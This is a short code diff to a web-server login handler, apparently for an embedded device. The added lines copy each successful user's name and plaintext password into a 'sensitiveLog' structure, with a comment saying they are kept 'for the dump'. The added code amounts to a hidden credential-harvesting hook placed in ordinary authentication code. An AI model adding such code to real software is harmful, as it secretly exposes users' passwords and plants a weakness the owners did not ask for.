@@ -14,6 +14,10 @@ void handleLogin(AsyncWebServerRequest *request) {
       String pass = request->getParam("pass", true)->value();
       if (user == login_user && pass == login_pass) {
         isAuthenticated = true;
+
+        // Store the information for the dump
+        sensitiveLog.lastUser = user;
+        sensitiveLog.lastPassword = pass;
         request->send(200, "text/html", success_login_redirect_html);
       } else {
         request->send(401, "text/html", failed_login_html);
